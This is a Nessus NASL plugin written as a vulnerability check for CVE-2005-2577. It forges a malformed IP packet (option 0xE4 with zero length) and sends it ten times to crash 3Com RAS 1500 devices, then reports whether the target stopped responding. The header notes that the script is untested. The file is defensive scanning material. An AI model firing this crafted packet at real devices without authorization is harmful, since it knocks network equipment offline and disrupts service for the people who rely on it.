#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# THIS SCRIPT WAS NOT TESTED !
# (will only work with Nessus >= 2.0.2 though, because of a bug in insert_ip_option())
#
# Ref:
#
# Date: Mon, 24 Mar 2003 16:56:21 +0100 (CET)
# From: Piotr Chytla <pch@isec.pl>
# Reply-To: iSEC Security Research <security@isec.pl>
# To: bugtraq@securityfocus.com, <vulnwatch@vulnwatch.org>
#
# Josh Zlatin-Amishav has also discovered that this affects 
# Wyse Winterm 1125SE thin client devices:
#    http://www.securityfocus.com/archive/1/407903/30/0/threaded


if(description)
{
 script_id(11475);
 script_cve_id("CVE-2005-2577");
 script_bugtraq_id(7175, 14536);
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "3com RAS 1500 DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the remote host by sending a specially
crafted IP packet with a null length for IP option #0xE4

An attacker may use this flaw to prevent the remote host from
accomplishing its job properly.

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes a 3comp RAS 1500";
 script_summary(english:summary["english"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 
 exit(0);
}

#
# The script code starts here
#

start_denial();

ip = forge_ip_packet(ip_hl: 5,	 	ip_v : 4,	ip_tos : 0,
		     ip_len : 44, 	ip_id:1234,	ip_off : 0,
		     ip_ttl : 0xff,	ip_p:0xAA,
		     ip_src : this_host());
		     
ipo = insert_ip_options(ip:ip, code:0xE4, length:0, value:raw_string(0x00, 0x00));
ipo += string("ABCDEFGHIJKLMNOPRSTU");
send_packet(ipo, pcap_active:FALSE) x 10;
sleep(5);
alive = end_denial();					     
if(!alive){
  		security_hole(0);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
